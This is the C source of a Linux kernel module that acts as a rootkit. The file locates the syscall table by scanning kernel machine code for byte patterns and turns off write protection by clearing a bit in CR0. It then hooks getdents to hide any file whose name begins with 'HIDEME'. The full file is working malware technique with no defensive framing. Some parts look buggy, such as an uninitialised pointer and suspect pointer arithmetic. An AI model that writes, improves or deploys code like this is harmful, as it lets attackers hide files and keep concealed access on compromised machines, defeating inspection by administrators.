#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/unistd.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan Castets & Olivier Huge");
MODULE_DESCRIPTION("Fallen Dragon, Peter F. Hamilton");

#define SEARCH_RANGE 512
#define PATTERN_SIZE 7
#define MAGIC_PREFIX "HIDEME"
#define MAGIC_PREFIX_LEN 6

struct linux_dirent {
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[1];
};

static void **sys_call_table;
static void **ia32_sys_call_table;

asmlinkage long (*real_getdents)(struct pt_regs *);

asmlinkage long fake_getdents(struct pt_regs *regs) {
  int i, j;
  unsigned char *buffer;
  unsigned char *buffer_dirent;
  unsigned char *buffer_next_dirent;
  unsigned short d_reclen;
  unsigned short last_d_reclen;
  unsigned short next_d_reclen;
  long bytes_read;
  struct linux_dirent __user *dirent_user;
  struct linux_dirent *dirent;
  struct linux_dirent *last_dirent;
  struct linux_dirent *next_dirent;

  bytes_read = (*real_getdents)(regs);
  dirent_user = (struct linux_dirent __user *)regs->si;
  buffer = kmalloc(bytes_read, GFP_KERNEL);
  if (!buffer) {
    printk(KERN_INFO "failed to kmalloc buffer");
    return bytes_read;
  }
  
  if(copy_from_user(buffer, (unsigned char *)dirent_user, bytes_read)) {
    printk(KERN_INFO "failed to copy_from_user dirent");
    kfree(buffer);
    return bytes_read;
  }
  
  i = 0;
  last_d_reclen = 0;
  dirent = (struct linux_dirent *)buffer;
  
  while (i < bytes_read) {
    d_reclen = dirent->d_reclen;

    j = 0;
    while (j < MAGIC_PREFIX_LEN && dirent->d_name[j] != '\0' && dirent->d_name[j] == MAGIC_PREFIX[j])
      j++;

    if (j == MAGIC_PREFIX_LEN) {
      if (last_d_reclen == 0) {
	buffer_dirent = kmalloc(d_reclen, GFP_KERNEL);
	if (!buffer_dirent) {
	  printk(KERN_INFO "failed to kmalloc buffer_dirent");
	  kfree(buffer);
	  return bytes_read;
	}

	next_dirent = (struct linux_dirent *)(buffer + i + d_reclen);
	next_d_reclen = next_dirent->d_reclen;
	buffer_next_dirent = kmalloc(next_d_reclen, GFP_KERNEL);
	if (!buffer_next_dirent) {
	  printk(KERN_INFO "failed to kmalloc buffer_next_dirent");
	  kfree(buffer_dirent);
	  kfree(buffer);
	  return bytes_read;
	}
	
	memcpy(buffer_dirent, dirent, d_reclen);
	memcpy(buffer_next_dirent, next_dirent, next_d_reclen);

	memcpy(dirent, buffer_next_dirent, next_d_reclen);
	memcpy(dirent + next_d_reclen, buffer_dirent, d_reclen);

	kfree(buffer_dirent);
	kfree(buffer_next_dirent);
      }
      else
	last_dirent->d_reclen += dirent->d_reclen;
    }

    last_d_reclen = d_reclen;
    last_dirent = dirent;
    i += d_reclen;
    dirent = (struct linux_dirent *)(buffer + i);
  }

  if (copy_to_user(dirent_user, buffer, bytes_read))
    printk(KERN_INFO "failed to copy_to_user buffer");
  
  kfree(buffer);
  return bytes_read;
}

static void search_sys_call_table(void) {
  int i, j;
  int *do_syscall_64_offset;
  int *sys_call_table_offset;
  int *ia32_sys_call_table_offset;
  unsigned char *do_syscall_64;
  unsigned char *entry_SYSCALL_64 = (unsigned char *)native_read_msr(MSR_LSTAR);
  unsigned char pattern_0[] = {0x48, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0xe8};
  unsigned char pattern_1[] = {0x48, 0x19, 0xc0, 0x48, 0x21, 0xc7, 0x48};
  unsigned char pattern_2[] = {0xd2, 0x21, 0xd0, 0x48, 0x89, 0xef, 0x48};

  for (i = 0; i < SEARCH_RANGE; i++) {
    j = 0;
    while (j < PATTERN_SIZE && entry_SYSCALL_64[i + j] == pattern_0[j])
      j++;

    if (j == PATTERN_SIZE) {
      do_syscall_64_offset = (int *)(entry_SYSCALL_64 + i + PATTERN_SIZE);
      do_syscall_64 = (unsigned char *)(entry_SYSCALL_64 + i + PATTERN_SIZE + sizeof(int) + *do_syscall_64_offset);
      printk(KERN_INFO "call to do_syscall_64 at %p (%p)", entry_SYSCALL_64 + i + PATTERN_SIZE - 1, do_syscall_64);
      break;
    } 
  }

  if (!do_syscall_64) {
    printk(KERN_INFO "failed to find do_syscall_64 address");
    return;
  }
  
  for (i = 0; i < SEARCH_RANGE; i++) {
    j = 0;
    while (j < PATTERN_SIZE && do_syscall_64[i + j] == pattern_1[j])
      j++;
    
    if (j == PATTERN_SIZE) {
      sys_call_table_offset = (int *)(do_syscall_64 + i + PATTERN_SIZE + 3);
      sys_call_table = (void **)(*sys_call_table_offset);
      printk(KERN_INFO "call to sys_call_table at %p (%p)", do_syscall_64 + i + PATTERN_SIZE - 1, sys_call_table); 
      break;
    } 
  }

  for ( ; i < SEARCH_RANGE; i++) {
    j = 0;
    while (j < PATTERN_SIZE && do_syscall_64[i + j] == pattern_2[j])
      j++;
    
    if (j == PATTERN_SIZE) {
      ia32_sys_call_table_offset = (int *)(do_syscall_64 + i + PATTERN_SIZE + 3);
      ia32_sys_call_table = (void **)(*ia32_sys_call_table_offset);
      printk(KERN_INFO "call to ia32_sys_call_table at %p (%p)", do_syscall_64 + i + PATTERN_SIZE - 1, ia32_sys_call_table);
    }
  }

  if (!sys_call_table)
    printk(KERN_INFO "failed to find sys_call_table address");

  if (!ia32_sys_call_table)
    printk(KERN_INFO "failed to find ia32_sys_call_table address");
}

static void hook_syscall(void) {
  if (!sys_call_table) {
    printk(KERN_INFO "failed to hook syscall64, sys_call_table address is missing");
    return;
  }

  write_cr0(read_cr0() & ~0x10000);
  real_getdents = sys_call_table[__NR_getdents];
  sys_call_table[__NR_getdents] = fake_getdents;
  write_cr0(read_cr0() | 0x10000);
}

static void unhook_syscall(void) {
  if (!sys_call_table) {
    printk(KERN_INFO "failed to reset syscall, sys_call_table address is missing");
    return;
  }

  write_cr0(read_cr0() & ~0x10000);
  sys_call_table[__NR_getdents] = real_getdents;
  write_cr0(read_cr0() | 0x10000);
}

int init_module(void) {
  printk(KERN_INFO "prime module started");
  search_sys_call_table();
  hook_syscall();
  return 0;
}

void cleanup_module(void) {
  unhook_syscall();
  printk(KERN_INFO "prime module stopped");
}
